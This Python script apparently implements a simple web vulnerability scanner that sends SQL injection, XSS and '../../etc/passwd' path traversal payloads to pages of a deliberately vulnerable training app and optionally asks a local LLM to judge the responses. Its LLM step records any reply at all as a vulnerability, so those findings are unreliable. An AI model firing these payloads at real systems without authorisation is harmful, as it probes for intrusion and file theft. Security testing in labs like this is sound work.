import ollama
import requests
from bs4 import BeautifulSoup
import time
import json
from tenacity import retry, stop_after_attempt

class SmartPentester:
    def __init__(self):
        self.session = requests.Session()
        self.headers = {"User-Agent": "Mozilla/5.0"}
        self.llm_model = "phi"  # Lightweight LLM
        self.timeout = 10  # Request timeout in seconds
        self.llm_enabled = True  # Toggle AI analysis
        self.findings = {}  # Store detected vulnerabilities

    @retry(stop=stop_after_attempt(2))
    def query_llm(self, prompt):
        """Query LLM with safe memory limits"""
        try:
            response = ollama.generate(
                model=self.llm_model,
                options={"num_ctx": 1024, "temperature": 0.3},  # Adjust temp for stable responses
                prompt=prompt[:500]  # Truncate to avoid memory issues
            )
            return response["response"]
        except Exception as e:
            print(f"\n[LLM Error] {str(e)[:80]}...")
            return None

    def fast_detect(self, response_text, vuln_type):
        """Rule-based detection for fast scanning"""
        indicators = {
            "SQLi": ["Welcome", "SQL syntax", "OR 1=1"],
            "XSS": ["<script>", "alert(1)"],
            "Path Traversal": ["root:x:", "etc/passwd"]
        }
        
        if any(indicator in response_text for indicator in indicators[vuln_type]):
            return f"{vuln_type}: High Risk (Rule-Based)"
        return None

    def scan_endpoint(self, url):
        """Perform vulnerability assessment"""
        print(f"\n🔍 Scanning {url}...")
        start_time = time.time()
        
        tests = [
            ("SQLi", "' OR 1=1 --", "POST"),
            ("XSS", "<script>alert(1)</script>", "GET"),
            ("Path Traversal", "../../etc/passwd", "GET")
        ]

        self.findings[url] = {}

        for vuln_type, payload, method in tests:
            try:
                print(f"  Testing {vuln_type:<15}", end="", flush=True)
                
                # Send payload
                if method == "POST":
                    resp = self.session.post(url, data={"login": payload, "password": "x"}, timeout=self.timeout)
                else:
                    resp = self.session.get(f"{url}?input={payload}", timeout=self.timeout)

                # Phase 1: Fast rule-based check
                if result := self.fast_detect(resp.text, vuln_type):
                    print(f"\r  ✅ {result}")
                    self.findings[url][vuln_type] = "Vulnerable (Rule-Based)"
                    continue
                    
                # Phase 2: AI-powered verification (if enabled)
                if self.llm_enabled:
                    llm_prompt = f"""Security check for {vuln_type}:
                    Payload: {payload}
                    Response: {resp.text[:300]}..."""
                    
                    if llm_result := self.query_llm(llm_prompt):
                        print(f"\r  ⚠️  {vuln_type}: LLM detected anomaly")
                        self.findings[url][vuln_type] = "Vulnerable (LLM Analysis)"
                    else:
                        print(f"\r  ❌ {vuln_type}: No detection")
                else:
                    print(f"\r  ❌ {vuln_type}: No detection")

            except requests.exceptions.Timeout:
                print(f"\r  ⌛ {vuln_type}: Timeout")
                self.findings[url][vuln_type] = "Timeout"
            except Exception as e:
                print(f"\r  ❗ {vuln_type} failed: {str(e)[:30]}...")
                self.findings[url][vuln_type] = "Error"

        print(f"\nScan completed in {time.time() - start_time:.1f}s")

    def generate_report(self):
        """Save findings in JSON format"""
        with open("scan_report.json", "w") as f:
            json.dump(self.findings, f, indent=4)
        print("\n📄 Report saved as scan_report.json")

if __name__ == "__main__":
    pentester = SmartPentester()
    
    # Configuration
    pentester.llm_enabled = True  # Set False for rule-based scanning only
    pentester.timeout = 15  # Adjust timeout if needed
    
    targets = [
        "http://bwapp.hakhub.net/login.php",
        "http://bwapp.hakhub.net/xss_get.php"
    ]
    
    for target in targets:
        pentester.scan_endpoint(target)

    pentester.generate_report()